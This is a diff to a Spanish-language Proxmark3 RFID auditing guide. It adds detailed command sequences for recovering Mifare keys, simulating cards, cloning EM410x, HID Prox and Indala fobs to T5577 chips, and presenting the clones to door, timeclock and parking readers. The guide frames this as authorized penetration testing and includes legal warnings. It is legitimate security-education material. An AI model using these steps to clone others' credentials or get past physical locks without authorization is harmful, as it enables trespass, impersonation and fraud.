@@ -13,38 +13,68 @@ El contenido está diseñado tanto para principiantes que se inician en la segur
 - [1. Fundamentos e Instalación](#1-fundamentos-e-instalación)
   - [1.1. Introducción a las Tecnologías Clave](#11-introducción-a-las-tecnologías-clave)
   - [1.2. Puesta en Marcha: Compilación y Flasheo del Firmware](#12-puesta-en-marcha-compilación-y-flasheo-del-firmware)
-    - [1. Preparación del Entorno (Windows)](#1-preparación-del-entorno-windows)
-    - [2. Preparación del Entorno (Linux/WSL)](#2-preparación-del-entorno-linuxwsl)
-    - [3. Configuración del Makefile.platform](#3-configuración-del-makefileplatform)
-    - [4. Compilación y Flasheo](#4-compilación-y-flasheo)
-    - [5. Recuperación de un Brick (El "Truco del Botón")](#5-recuperación-de-un-brick-el-truco-del-botón)
+    - [Preparación del Entorno (Windows)](#preparación-del-entorno-windows)
+    - [Preparación del Entorno (Linux/WSL)](#preparación-del-entorno-linuxwsl)
+    - [Configuración del Makefile.platform](#configuración-del-makefileplatform)
+    - [Compilación y Flasheo](#compilación-y-flasheo)
+    - [Recuperación de un Brick (El "Truco del Botón")](#recuperación-de-un-brick-el-truco-del-botón)
 - [2. Reconocimiento y Obtención de Claves](#2-reconocimiento-y-obtención-de-claves)
   - [2.1. Identificación y Análisis Inicial de la Tarjeta](#21-identificación-y-análisis-inicial-de-la-tarjeta)
+    - [Detección Automática Universal](#detección-automática-universal)
+    - [Análisis Detallado de Mifare Classic](#análisis-detallado-de-mifare-classic)
+    - [Interpretación de la Salida](#interpretación-de-la-salida)
   - [2.2. Ataques para la Obtención de Claves](#22-ataques-para-la-obtención-de-claves)
-    - [1. Ataque de Diccionario (Claves por Defecto)](#1-ataque-de-diccionario-claves-por-defecto)
-    - [2. Ataque Nested (Claves No Estándar)](#2-ataque-nested-claves-no-estándar)
-    - [3. Ataque StaticNested](#3-ataque-staticnested)
-  - [2.3. Lectura del Contenido de la Tarjeta](#23-lectura-del-contenido-de-la-tarjeta)
+    - [Automatización Completa con autopwn](#automatización-completa-con-autopwn)
+    - [Ataque de Diccionario (Claves por Defecto)](#ataque-de-diccionario-claves-por-defecto)
+    - [Ataque Nested (Derivación de Claves)](#ataque-nested-derivación-de-claves)
+    - [Ataque Hardnested (Nested Avanzado)](#ataque-hardnested-nested-avanzado)
+    - [Ataque Darkside (Explotación PRNG)](#ataque-darkside-explotación-prng)
+    - [Ataque StaticNested (Random Débil)](#ataque-staticnested-random-débil)
+  - [2.3. Lectura y Análisis del Contenido](#23-lectura-y-análisis-del-contenido)
+    - [Volcado Completo de la Tarjeta](#volcado-completo-de-la-tarjeta)
+    - [Visualización y Análisis de Dumps](#visualización-y-análisis-de-dumps)
+    - [Análisis de Controles de Acceso](#análisis-de-controles-de-acceso)
 - [3. Clonación y Manipulación](#3-clonación-y-manipulación)
-  - [3.1. Creación de un Backup y Clonación](#31-creación-de-un-backup-y-clonación)
-    - [1. Creación del Archivo de Backup](#1-creación-del-archivo-de-backup)
-    - [2. Clonación a una Tarjeta Mágica](#2-clonación-a-una-tarjeta-mágica)
-  - [3.2. Manipulación de Datos](#32-manipulación-de-datos)
+  - [3.1. Clonación de Tarjetas Mifare Classic](#31-clonación-de-tarjetas-mifare-classic)
+    - [Tipos de Tarjetas Mágicas](#tipos-de-tarjetas-mágicas)
+    - [Procedimiento de Clonación Completo](#procedimiento-de-clonación-completo)
+    - [Clonación con Tarjetas Gen1A](#clonación-con-tarjetas-gen1a)
+    - [Clonación con Tarjetas Gen2 (CUID/FUID)](#clonación-con-tarjetas-gen2-cuidfuid)
+    - [Clonación con Tarjetas Gen3 (APDU)](#clonación-con-tarjetas-gen3-apdu)
+    - [Clonación con Tarjetas Gen4 (Ultimate Magic Card)](#clonación-con-tarjetas-gen4-ultimate-magic-card)
+    - [Verificación Post-Clonación](#verificación-post-clonación)
+  - [3.2. Manipulación de Datos en Tarjetas](#32-manipulación-de-datos-en-tarjetas)
+    - [Escritura Directa de Bloques](#escritura-directa-de-bloques)
+    - [Manipulación de Value Blocks](#manipulación-de-value-blocks)
+    - [Conversión entre Formatos](#conversión-entre-formatos)
+    - [Casos de Uso Prácticos](#casos-de-uso-prácticos)
 - [4. Pruebas Reales y Simulación](#4-pruebas-reales-y-simulación)
   - [4.1. Simulación de Tarjetas](#41-simulación-de-tarjetas)
-    - [Simulación de Alta Frecuencia (HF)](#simulación-de-alta-frecuencia-hf)
-    - [Simulación de Baja Frecuencia (LF)](#simulación-de-baja-frecuencia-lf)
+    - [Simulación de Alta Frecuencia (HF) - Mifare Classic](#simulación-de-alta-frecuencia-hf---mifare-classic)
+    - [Simulación de Baja Frecuencia (LF) - EM410x y Otros](#simulación-de-baja-frecuencia-lf---em410x-y-otros)
   - [4.2. Clonación de Etiquetas de Baja Frecuencia (Llaveros)](#42-clonación-de-etiquetas-de-baja-frecuencia-llaveros)
-    - [1. Leer la etiqueta original](#1-leer-la-etiqueta-original)
-    - [2. Escribir en la etiqueta virgen](#2-escribir-en-la-etiqueta-virgen)
+    - [Clonación de EM410x (Llaveros Genéricos)](#clonación-de-em410x-llaveros-genéricos)
+    - [Clonación de HID Prox (Control de Acceso)](#clonación-de-hid-prox-control-de-acceso)
+    - [Clonación de Indala](#clonación-de-indala)
+    - [Configuración Manual del Chip T55xx](#configuración-manual-del-chip-t55xx)
+    - [Borrado/Reset de Chip T55xx](#borradoreset-de-chip-t55xx)
   - [4.3. Pruebas de Acceso Físico](#43-pruebas-de-acceso-físico)
+    - [Metodología de Pruebas de Acceso](#metodología-de-pruebas-de-acceso)
+    - [Documentación de Resultados](#documentación-de-resultados)
+    - [Escenarios de Prueba Específicos](#escenarios-de-prueba-específicos)
+    - [Consideraciones Éticas y Legales](#consideraciones-éticas-y-legales)
 - [5. Herramientas Avanzadas y Automatización](#5-herramientas-avanzadas-y-automatización)
   - [5.1. Acelerando el Proceso de Auditoría](#51-acelerando-el-proceso-de-auditoría)
-    - [Diagnósticos Rápidos con fchck](#diagnósticos-rápidos-con-fchck)
-    - [Automatización Completa con autopwn](#automatización-completa-con-autopwn)
+    - [Verificación Rápida de Claves con fchk](#verificación-rápida-de-claves-con-fchk)
+    - [Automatización Completa con autopwn](#automatización-completa-con-autopwn-1)
   - [5.2. Modo de Operación Autónomo (Standalone)](#52-modo-de-operación-autónomo-standalone)
     - [Activación del Modo Standalone](#activación-del-modo-standalone)
-    - [Secuencia de Operaciones](#secuencia-de-operaciones)
+    - [Verificar Modo Standalone Compilado](#verificar-modo-standalone-compilado)
+    - [Modos Standalone Disponibles (LF)](#modos-standalone-disponibles-lf)
+    - [Modos Standalone Disponibles (HF)](#modos-standalone-disponibles-hf)
+    - [Modos Standalone de Recopilación de Datos](#modos-standalone-de-recopilación-de-datos)
+    - [Compilar Modos Standalone Personalizados](#compilar-modos-standalone-personalizados)
+    - [Casos de Uso Prácticos de Standalone](#casos-de-uso-prácticos-de-standalone)
 - [Conclusión](#conclusión)
 
 ---
@@ -110,7 +140,7 @@ libbz2-dev liblz4-dev libbluetooth-dev libpython3-dev libssl-dev libgd-dev
 | Scripts Python (opcional) | `libpython3-dev` |
 | Soporte NFC ePaper (opcional) | `libgd-dev` |
 
-> **⚠️ Advertencia Crítica sobre ModemManager:**
+> **Advertencia Crítica sobre ModemManager:**
 >
 > Un punto de fallo común en Linux es la interferencia del servicio **ModemManager**, que sondea automáticamente los puertos serie USB para detectar módems. Este servicio puede interferir con la comunicación del Proxmark3 e incluso **causar un brick del dispositivo durante el flasheo**. Es **obligatorio** deshabilitarlo antes de proceder:
 > ```bash
@@ -693,22 +723,22 @@ hf mf gen3blk -d A29558E4440804006263646566676869
 
 **Advertencias Críticas:**
 
-⚠️ **Tarjetas Gen1A:**
+**ADVERTENCIA - Tarjetas Gen1A:**
 - Son fácilmente detectables por sistemas de seguridad modernos
 - Algunos lectores ejecutan el comando de detección `40(7)` automáticamente
 - NO recomendadas para entornos con medidas anti-clonación activas
 
-⚠️ **Tarjetas Gen2:**
+**ADVERTENCIA - Tarjetas Gen2:**
 - Más difíciles de detectar que Gen1A
 - Algunos sistemas pueden detectarlas mediante pruebas de escritura directa al bloque 0
 - El ATQA y SAK pueden variar según el fabricante
 
-⚠️ **Configuración de ATQA/SAK:**
+**ADVERTENCIA - Configuración de ATQA/SAK:**
 - Debe coincidir **exactamente** con la tarjeta original
 - ATQA incorrecto puede causar que la tarjeta no sea reconocida
 - SAK incorrecto puede revelar que es una tarjeta mágica
 
-⚠️ **Recuperación de Tarjeta "Bricked":**
+**ADVERTENCIA - Recuperación de Tarjeta "Bricked":**
 
 Si una tarjeta Gen2 no responde después de escribir datos incorrectos en el bloque 0:
 
@@ -900,23 +930,23 @@ hf mf wrbl --blk 7 -b -k FFFFFFFFFFFF -d FFFFFFFFFFFFF00780 80 FFFFFFFFFFFF
 
 **Advertencias Críticas:**
 
-⚠️ **Bits de Acceso:**
+**ADVERTENCIA - Bits de Acceso:**
 - Los bits de acceso controlan qué claves pueden leer/escribir cada bloque
 - Configuración incorrecta puede **bloquear permanentemente** el sector
 - Siempre verificar con `hf mf acl -d <hex>` antes de escribir
 - NO modificar bits de acceso sin comprender completamente su funcionamiento
 
-⚠️ **Bloques de Valor:**
+**ADVERTENCIA - Bloques de Valor:**
 - Deben mantener el formato especial: Valor, ~Valor, Valor, Addr
 - El formato es validado por hardware en algunos lectores
 - Valores inconsistentes pueden ser rechazados o causar errores
 
-⚠️ **Sector Trailers:**
+**ADVERTENCIA - Sector Trailers:**
 - NUNCA modificar el sector trailer (bloque 3, 7, 11, etc.) sin backup
 - Perder las claves significa perder acceso permanente al sector
 - La clave B puede estar oculta (no legible) dependiendo de los bits de acceso
 
-⚠️ **Aspectos Legales:**
+**ADVERTENCIA - Aspectos Legales:**
 - La manipulación de tarjetas de pago, transporte o acceso ajenas es **ilegal**
 - Solo realizar en auditorías autorizadas o con sistemas propios
 - Documentar todos los cambios para el informe de auditoría
@@ -931,61 +961,550 @@ La simulación es una capacidad táctica extremadamente valiosa del Proxmark3. P
 
 El procedimiento para simular tarjetas varía según la frecuencia:
 
-#### Simulación de Alta Frecuencia (HF)
+#### Simulación de Alta Frecuencia (HF) - Mifare Classic
 
-El Proxmark3 puede emular una tarjeta Mifare Classic completa utilizando como fuente un archivo de volcado de memoria previamente obtenido.
+El Proxmark3 puede emular una tarjeta Mifare Classic completa utilizando como fuente un archivo de volcado de memoria previamente obtenido. El proceso requiere dos pasos: cargar los datos en la memoria del emulador y luego iniciar la simulación.
 
-El comando para iniciar la simulación es:
+**Procedimiento completo de simulación:**
+
+##### Paso 1: Cargar Datos en el Emulador
+
+Primero, es necesario cargar el volcado de la tarjeta en la memoria del emulador del Proxmark3:
 
 ```bash
-hf mf sim --uid <UID> --atqa <ATQA> --sak <SAK> --eml <archivo.eml>
+# Cargar desde archivo binario
+hf mf eload -f hf-mf-353C2AA6-dump.bin --1k
+
+# Cargar desde archivo EML
+hf mf eload -f hf-mf-353C2AA6-dump.eml --1k
+
+# Cargar desde archivo JSON
+hf mf eload -f hf-mf-353C2AA6-dump.json --1k
 ```
 
-#### Simulación de Baja Frecuencia (LF)
+**Parámetros del comando eload:**
 
-Para etiquetas LF más simples, como las de tipo EM410x, que solo transmiten un ID, se puede simular la etiqueta directamente a partir de su identificador leído.
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-f, --file <fn>` | Nombre del archivo de dump a cargar |
+| `--mini` | Mifare Classic Mini / S20 |
+| `--1k` | Mifare Classic 1k / S50 (por defecto) |
+| `--2k` | Mifare Classic/Plus 2k |
+| `--4k` | Mifare Classic 4k / S70 |
+| `--ul` | Mifare Ultralight family |
+| `-q, --qty <dec>` | Número de bloques a cargar (sobrescribe detección automática) |
 
-El comando para esta simulación es:
+##### Paso 2: Iniciar la Simulación
+
+Una vez cargados los datos, inicia la simulación:
 
 ```bash
-lf em 410x sim --id <ID>
+# Simulación básica (usa UID del emulador)
+hf mf sim
+
+# Simulación con UID específico
+hf mf sim -u 353C2AA6
+
+# Simulación con UID de 7 bytes
+hf mf sim -u 04112233445566
+
+# Simulación interactiva (muestra comandos del lector)
+hf mf sim -i
+
+# Simulación con logging extendido
+hf mf sim -x
+```
+
+**Parámetros del comando sim:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-u, --uid <hex>` | UID de 4 o 7 bytes. Si no se especifica, usa el del emulador |
+| `-i, --interactive` | Modo interactivo (muestra comandos anti-collision y auth) |
+| `-x, --crack` | Modo crack (activa logging PRNG para ataques) |
+| `-e, --emul` | Rellena el emulador con claves encontradas durante la simulación |
+| `-v, --verbose` | Salida verbose |
+
+**Secuencia completa recomendada:**
+
+```bash
+# 1. Obtener dump de la tarjeta original
+hf mf autopwn
+
+# 2. Cargar el dump en el emulador
+hf mf eload -f hf-mf-353C2AA6-dump.bin --1k
+
+# 3. Verificar que se cargó correctamente
+hf mf eview
+
+# 4. Iniciar simulación
+hf mf sim -u 353C2AA6
+
+# 5. Presentar el Proxmark3 al lector objetivo
+# El dispositivo actuará como la tarjeta clonada
+```
+
+**Verificación de la memoria del emulador:**
+
+```bash
+# Ver contenido cargado en el emulador
+hf mf eview
+
+# Obtener bloque específico del emulador
+hf mf egetblk --blk 0
+
+# Obtener sector específico del emulador
+hf mf egetsc --sector 0
+
+# Guardar contenido del emulador a archivo
+hf mf esave -f backup-emulator.bin
+```
+
+#### Simulación de Baja Frecuencia (LF) - EM410x y Otros
+
+Para etiquetas LF más simples, como las de tipo EM410x (llaveros comunes), la simulación es directa ya que solo transmiten un ID:
+
+```bash
+# Simulación básica con ID conocido
+lf em 410x sim --id 0F0368568B
+
+# Simulación desde reloj (genera ID basado en tiempo)
+lf em 410x sim --clk
+```
+
+**Simulación de otros formatos LF:**
+
+```bash
+# HID Prox
+lf hid sim -r 200670012d                    # Simular desde raw
+lf hid sim -w H10301 --fc 101 --cn 1337    # Simular con facility/card number
+
+# Indala
+lf indala sim -r a0000000c2c436c1          # Simular desde raw
+lf indala sim --heden 888                   # Simular formato Heden
+
+# Simulación de etiqueta T55xx guardada
+lf t55xx detect                              # Detectar configuración
+lf sim                                       # Simular desde buffer
+```
+
+**Ejemplo práctico completo - Clonar y simular HID Prox:**
+
+```bash
+# 1. Leer tarjeta HID original
+lf hid read
+# Salida: HID Prox TAG ID: 2006ec0c86 (13374) - Format Len: 26 bit - FC: 101 - Card: 1337
+
+# 2. Simular inmediatamente (datos en buffer)
+lf hid sim
+
+# 3. O simular con datos específicos
+lf hid sim -w H10301 --fc 101 --cn 1337
 ```
 
 ### 4.2. Clonación de Etiquetas de Baja Frecuencia (Llaveros)
 
-Aunque el concepto de clonación es similar al de HF, el procedimiento para etiquetas de Baja Frecuencia (LF) es diferente y utiliza comandos específicos. Las etiquetas LF, como los llaveros de acceso comunes (tipo EM410x), suelen ser más simples y solo transmiten un ID.
+Aunque el concepto de clonación es similar al de HF, el procedimiento para etiquetas de Baja Frecuencia (LF) es diferente y utiliza comandos específicos. Las etiquetas LF, como los llaveros de acceso comunes (tipo EM410x, HID Prox), suelen ser más simples y solo transmiten un ID, pero requieren configurar correctamente el chip virgen (T5577, EM4305).
 
-El proceso para clonar una etiqueta de acceso LF en una etiqueta virgen reescribible T5577 es el siguiente:
+#### Clonación de EM410x (Llaveros Genéricos)
 
-#### 1. Leer la etiqueta original
+El proceso para clonar una etiqueta EM410x en una etiqueta virgen reescribible T5577 es el siguiente:
 
-Coloca el llavero o tarjeta LF original en la antena LF del Proxmark3 y ejecuta el comando de lectura:
+##### Paso 1: Leer la Etiqueta Original
+
+Coloca el llavero o tarjeta LF original en la antena LF del Proxmark3:
 
 ```bash
+# Método 1: Lectura específica EM410x
+lf em 410x reader
+
+# Método 2: Búsqueda automática (recomendado)
+lf search
+```
+
+**Salida esperada:**
+```
+[+] EM 410x ID: 0F0368568B
+[+] EM410x XL ID: 00 0F 03 68 56 8B
+```
+
+##### Paso 2: Escribir en la Etiqueta Virgen
+
+Retira la etiqueta original y coloca una etiqueta T5577 (o compatible) virgen:
+
+```bash
+# Clonar con ID leído anteriormente
+lf em 410x clone --id 0F0368568B
+
+# O clonar a chip Q5/T5555
+lf em 410x clone --id 0F0368568B --q5
+
+# O clonar a chip EM4305
+lf em 410x clone --id 0F0368568B --em
+```
+
+**Parámetros del comando clone:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--id <hex>` | ID de 5 bytes (10 caracteres hexadecimales) |
+| `--q5` | Escribir en chip Q5/T5555 en lugar de T55x7 |
+| `--em` | Escribir en chip EM4305/4469 |
+
+##### Paso 3: Verificación
+
+```bash
+# Verificar que la clonación fue exitosa
+lf em 410x reader
+# Debe mostrar el mismo ID que la original
+
+# O búsqueda completa
+lf search
+```
+
+#### Clonación de HID Prox (Control de Acceso)
+
+Las tarjetas HID Prox son muy comunes en sistemas de control de acceso corporativo:
+
+##### Secuencia Completa:
+
+```bash
+# 1. Leer tarjeta HID original
+lf hid read
+# Salida ejemplo: HID Prox TAG ID: 2006ec0c86 - Format: H10301 - FC: 101 - Card: 1337
+
+# 2. Método de clonación A: Usando raw data
+lf hid clone -r 2006ec0c86
+
+# 3. Método de clonación B: Usando facility code y card number (más claro)
+lf hid clone -w H10301 --fc 101 --cn 1337
+
+# 4. Para chips Q5/T5555
+lf hid clone -w H10301 --fc 101 --cn 1337 --q5
+
+# 5. Para chips EM4305
+lf hid clone -w H10301 --fc 101 --cn 1337 --em
+
+# 6. Verificar clonación
+lf hid read
+```
+
+**Formatos Wiegand comunes:**
+
+| Formato | Descripción | Bits |
+|---------|-------------|------|
+| H10301 | HID Corporate 1000 (más común) | 26 |
+| H10302 | HID Corporate 1000 | 37 |
+| H10304 | HID Corporate 1000 | 37 |
+| H10320 | HID Simplex | 36 |
+
+#### Clonación de Indala
+
+Para sistemas que usan tarjetas Indala:
+
+```bash
+# 1. Leer tarjeta Indala
+lf indala read
+
+# 2. Clonar usando raw data
+lf indala clone -r a0000000c2c436c1
+
+# 3. O usando formato Heden
+lf indala clone --heden 888
+
+# 4. Con facility code y card number (formato H10301)
+lf indala clone --fc 101 --cn 1337
+
+# 5. Verificar
+lf indala read
+```
+
+#### Configuración Manual del Chip T55xx
+
+Para clonaciones avanzadas o cuando los comandos automáticos fallan:
+
+```bash
+# 1. Detectar chip virgen
+lf t55xx detect
+
+# 2. Configurar para EM410x
+lf t55xx config --FSK --bi --inv --rf 64
+
+# 3. Escribir datos en bloques
+lf t55xx write -b 0 -d 00148040  # Configuración
+lf t55xx write -b 1 -d 0F036856  # Datos ID parte 1
+lf t55xx write -b 2 -d 8B000000  # Datos ID parte 2
+
+# 4. Verificar escritura
+lf t55xx read
 lf em 410x reader
 ```
 
-El Proxmark3 mostrará el ID de la etiqueta, por ejemplo: `EM410x ID 1234567890`.
+**Configuraciones T55xx para diferentes formatos:**
 
-#### 2. Escribir en la etiqueta virgen
+| Formato | Modulación | Configuración |
+|---------|-----------|---------------|
+| EM410x | ASK/Manchester | `--ASK --bi --inv` |
+| HID Prox | FSK | `--FSK --rf 50` |
+| Indala | PSK | `--PSK1 --rf 32` |
 
-Retira la etiqueta original y coloca una etiqueta T5577 virgen en la antena LF.
+#### Borrado/Reset de Chip T55xx
 
-Ejecuta el comando de escritura, utilizando el ID leído en el paso anterior:
+Si necesitas borrar un chip T55xx para reutilizarlo:
 
 ```bash
-lf em 410x clone --id 1234567890
+# Limpiar configuración (restaurar a valores por defecto)
+lf t55xx wipe
+
+# O escribir configuración específica
+lf t55xx write -b 0 -d 00088048
 ```
+
+**Advertencias Importantes:**
+
+**ADVERTENCIA - Compatibilidad de Chips:**
+- No todos los chips vírgenes son compatibles con todos los formatos
+- T55x7/T5577: Más versátil, compatible con la mayoría de formatos
+- Q5/T5555: Similar a T55x7 pero con algunas diferencias de timing
+- EM4305/4469: Específico para formatos ASK, no soporta FSK complejo
+
+**ADVERTENCIA - Calidad de la Antena:**
+- La clonación LF requiere **muy buena proximidad** entre chip y antena
+- Mantén el chip centrado sobre la antena LF del Proxmark3
+- Algunos chips requieren múltiples intentos de escritura
+
+**ADVERTENCIA - Detección de Clones:**
+- Algunos lectores avanzados pueden detectar chips T55xx
+- Lectores que verifican características específicas del chip original pueden rechazar clones
+- Sistemas HID modernos pueden usar "Secure Identity" (no clonable con T55xx)
+
+**ADVERTENCIA - Protección con Contraseña:**
+- Algunos chips T55xx pueden tener contraseña configurada
+- Si el chip está protegido, primero debes detectar/recuperar la contraseña
+- Usar `lf t55xx detect` con opciones de contraseña si es necesario
 
 ### 4.3. Pruebas de Acceso Físico
 
-El objetivo final de una auditoría de control de acceso es verificar si un sistema físico real es vulnerable. La clonación y simulación de credenciales son los medios para alcanzar este fin.
+El objetivo final de una auditoría de control de acceso es verificar si un sistema físico real es vulnerable. La clonación y simulación de credenciales son los medios para alcanzar este fin. Esta fase requiere una metodología estructurada para documentar adecuadamente los resultados y garantizar que se mantienen los límites éticos y legales de la auditoría.
 
-El procedimiento de validación final consiste en:
+#### Metodología de Pruebas de Acceso
 
-Una vez que se ha clonado una tarjeta física o se está simulando una credencial con el Proxmark3, el último paso es presentar el dispositivo (la tarjeta clonada o el Proxmark3 en modo simulación) al lector del sistema objetivo (p. ej., una cerradura de puerta de oficina, un torno de metro, etc.).
+##### Fase 1: Preparación y Autorización
 
-Un resultado exitoso, como la apertura de la cerradura o la validación del acceso, confirma de manera inequívoca que el sistema es vulnerable a ataques de clonación, proporcionando una evidencia tangible del riesgo de seguridad.
+**Requisitos previos obligatorios:**
+
+1. **Autorización por Escrito:**
+   - Obtener autorización explícita y por escrito del propietario del sistema
+   - Definir claramente el alcance de las pruebas (ubicaciones, horarios, métodos)
+   - Establecer procedimientos de escalación en caso de incidentes
+
+2. **Coordinación:**
+   - Informar al personal de seguridad sobre la auditoría
+   - Coordinar horarios para minimizar interrupciones
+   - Establecer puntos de contacto para emergencias
+
+3. **Preparación del Equipo:**
+   - Verificar que las credenciales clonadas/simuladas funcionan antes de la prueba
+   - Preparar equipos de respaldo (tarjetas adicionales, baterías)
+   - Documentación lista para registro en tiempo real
+
+##### Fase 2: Ejecución de Pruebas
+
+**Procedimiento de validación:**
+
+**Opción A: Prueba con Tarjeta Clonada**
+
+```bash
+# Preparación previa
+# 1. Clonar tarjeta en entorno controlado
+hf mf autopwn                           # Obtener dump
+hf mf restore --1k -f dump.bin         # Restaurar en tarjeta mágica
+hf mf info                              # Verificar clonación
+
+# 2. En campo: Presentar tarjeta clonada al lector
+# - Aproximar la tarjeta al lector (distancia típica: 1-10 cm)
+# - Observar respuesta del sistema (LED, sonido, apertura)
+# - Documentar resultado inmediatamente
+```
+
+**Opción B: Prueba con Simulación (Proxmark3)**
+
+```bash
+# Preparación
+hf mf eload -f dump.bin --1k           # Cargar dump en emulador
+hf mf sim -u 04112233                  # Iniciar simulación
+
+# En campo: 
+# - Mantener Proxmark3 conectado a batería externa
+# - Aproximar antena HF del Proxmark3 al lector (muy cerca, <5cm)
+# - El Proxmark3 debe estar en modo sim activo
+# - Observar LEDs del Proxmark3 (indican comunicación)
+# - Documentar interacción
+```
+
+**Opción C: Prueba con Llavero LF Clonado**
+
+```bash
+# Preparación
+lf em 410x clone --id 0F0368568B      # Clonar a T5577
+lf em 410x reader                      # Verificar
+
+# En campo:
+# - Aproximar llavero clonado al lector (1-15 cm)
+# - Algunos lectores LF requieren contacto muy cercano
+# - Documentar respuesta del sistema
+```
+
+##### Fase 3: Documentación de Resultados
+
+**Información a registrar por cada prueba:**
+
+| Campo | Descripción | Ejemplo |
+|-------|-------------|--------|
+| Fecha/Hora | Timestamp de la prueba | 2025-12-06 14:30:15 |
+| Ubicación | Lector específico probado | Puerta principal oficina 3er piso |
+| Tipo de credencial | Original/Clonada/Simulada | Clonada en Gen2 CUID |
+| UID utilizado | Identificador de la credencial | 04112233445566 |
+| Método | Técnica de clonación usada | hf mf autopwn + restore |
+| Resultado | Exitoso/Fallido | Exitoso - Puerta abierta |
+| Observaciones | Detalles adicionales | LED verde, beep, apertura inmediata |
+| Evidencia | Fotos/videos (si autorizado) | IMG_20251206_143015.jpg |
+
+**Template de registro:**
+
+```
+=== REGISTRO DE PRUEBA DE ACCESO ===
+Fecha: 2025-12-06 14:30:15
+Auditor: [Nombre]
+Ubicación: Puerta principal, 3er piso
+
+CREDENCIAL ORIGINAL:
+- Tipo: Mifare Classic 1K
+- UID: 04112233445566
+- Método de obtención: Préstamo autorizado de empleado
+- Ataques exitosos: hf mf autopwn (nested attack)
+
+CREDENCIAL CLONADA:
+- Tarjeta: Gen2 CUID
+- UID clonado: 04112233445566
+- Verificación previa: OK (hf mf info)
+
+RESULTADO:
+✓ EXITOSO
+- Lector respondió inmediatamente
+- LED cambió de rojo a verde
+- Sonido de confirmación
+- Puerta se desbloqueó
+- Tiempo de respuesta: <1 segundo
+
+IMPLICACIONES:
+- Sistema vulnerable a clonación
+- No hay detección de tarjetas mágicas
+- No hay validación adicional (PIN, biométrico)
+
+RECOMENDACIONES:
+1. Migrar a tecnología más segura (DESFire EV2/EV3)
+2. Implementar autenticación multifactor
+3. Monitoreo de intentos de acceso duplicados
+===================================
+```
+
+##### Fase 4: Escenarios de Prueba Específicos
+
+**Escenario 1: Control de Acceso de Puerta**
+
+```
+Objetivo: Verificar si un clon permite acceso no autorizado
+
+Pasos:
+1. Obtener credencial legítima (préstamo autorizado)
+2. Extraer claves: hf mf autopwn
+3. Clonar a tarjeta mágica Gen2
+4. Devolver credencial original al propietario
+5. Intentar acceso con credencial clonada
+6. Documentar: ¿Se otorgó acceso? ¿Hay logging?
+
+Resultado esperado: Si exitoso, demuestra vulnerabilidad crítica
+```
+
+**Escenario 2: Sistema de Fichaje Laboral**
+
+```
+Objetivo: Verificar suplantación de identidad en sistema de asistencia
+
+Pasos:
+1. Clonar credencial de empleado (con autorización)
+2. Intentar fichar con credencial clonada
+3. Verificar si el sistema registra la asistencia
+4. Comprobar si se detecta uso simultáneo (credencial original + clon)
+
+Resultado esperado: Detección de fraude de asistencia
+```
+
+**Escenario 3: Llavero de Parking/Barreras**
+
+```
+Objetivo: Clonar llavero LF de acceso vehicular
+
+Pasos:
+1. Leer llavero: lf search
+2. Clonar a T5577: lf em 410x clone --id <ID>
+3. Probar llavero clonado en barrera
+4. Verificar apertura y logging del sistema
+
+Resultado esperado: Acceso vehicular no autorizado
+```
+
+#### Detección y Contramedidas Durante Pruebas
+
+**Indicadores de que el sistema puede estar detectando la clonación:**
+
+- Lector parpadea pero no abre (posible detección)
+- Demora inusual en la respuesta del lector
+- Sonido de error o LED rojo prolongado
+- Sistema solicita autenticación adicional (PIN)
+- Alerta de seguridad activada
+
+**Si el sistema detecta la clonación:**
+
+1. **Detener inmediatamente** el intento
+2. Contactar al punto de contacto de seguridad
+3. Documentar el mecanismo de detección (información valiosa)
+4. Evaluar contramedidas implementadas
+5. Incluir en el informe como punto positivo de seguridad
+
+#### Consideraciones Éticas y Legales
+
+**ADVERTENCIAS CRÍTICAS:**
+
+**Aspectos Legales:**
+- La clonación de credenciales ajenas **sin autorización es ilegal** en la mayoría de jurisdicciones
+- Puede constituir delitos de:
+  - Acceso no autorizado a sistemas informáticos
+  - Suplantación de identidad
+  - Robo de servicios
+  - Fraude
+- Las penas pueden incluir prisión y multas significativas
+
+**Límites de la Auditoría:**
+- Solo probar en sistemas expresamente autorizados
+- No exceder el alcance definido en el contrato
+- No acceder a áreas no incluidas en la autorización
+- No clonar credenciales de personas no informadas sin autorización del responsable del sistema
+
+**Responsabilidad Profesional:**
+- Mantener confidencialidad total de los hallazgos
+- No divulgar vulnerabilidades antes de que sean corregidas
+- Entregar informe detallado solo a personal autorizado
+- Destruir credenciales clonadas al finalizar la auditoría
+
+**Evidencia y Documentación:**
+- Fotografías/videos solo con autorización explícita
+- Evitar capturar información sensible de terceros
+- Almacenar evidencia de forma segura
+- Seguir normativas de protección de datos (GDPR, etc.)
+
+Un resultado exitoso, como la apertura de la cerradura o la validación del acceso, confirma de manera inequívoca que el sistema es vulnerable a ataques de clonación, proporcionando una evidencia tangible del riesgo de seguridad que debe ser comunicada al cliente con recomendaciones de remediación específicas.
 
 Tras completar las pruebas manuales, es útil conocer herramientas que pueden automatizar y acelerar estos procesos para auditorías más eficientes.
 
@@ -993,48 +1512,631 @@ Tras completar las pruebas manuales, es útil conocer herramientas que pueden au
 
 ### 5.1. Acelerando el Proceso de Auditoría
 
-En un escenario de auditoría real, la eficiencia es un factor clave. Mientras que los comandos manuales son excelentes para el aprendizaje y el análisis detallado, las herramientas de automatización permiten al analista pasar de ataques puntuales a evaluaciones rápidas y completas de un sistema.
+En un escenario de auditoría real, la eficiencia es un factor clave. Mientras que los comandos manuales son excelentes para el aprendizaje y el análisis detallado, las herramientas de automatización permiten al analista pasar de ataques puntuales a evaluaciones rápidas y completas de un sistema. El firmware RRG/Iceman incluye comandos especializados que agilizan dramáticamente el proceso de pentesting de tarjetas RFID.
 
-A continuación se describen dos comandos avanzados para acelerar el proceso de auditoría de tarjetas Mifare Classic:
+#### Verificación Rápida de Claves con fchk
 
-#### Diagnósticos Rápidos con fchck
+El comando `hf mf fchk` (fast check) es una herramienta de verificación de claves optimizada para máxima velocidad. A diferencia de los comandos de lectura tradicionales que intentan autenticarse y luego leer datos, `fchk` **solo realiza el proceso de autenticación**, lo que lo hace significativamente más rápido para validar diccionarios de claves.
 
-El comando `hf mf fchk` (fast check) se utiliza para verificar rápidamente si una clave candidata es válida para un sector específico. Es significativamente más rápido que intentar una lectura completa del bloque, ya que solo realiza el proceso de autenticación. Es especialmente útil para probar rápidamente una clave de un diccionario sin tener que realizar una lectura de datos.
+**Ventajas de fchk:**
+- **5-10 veces más rápido** que métodos tradicionales de verificación
+- Puede probar miles de claves en minutos
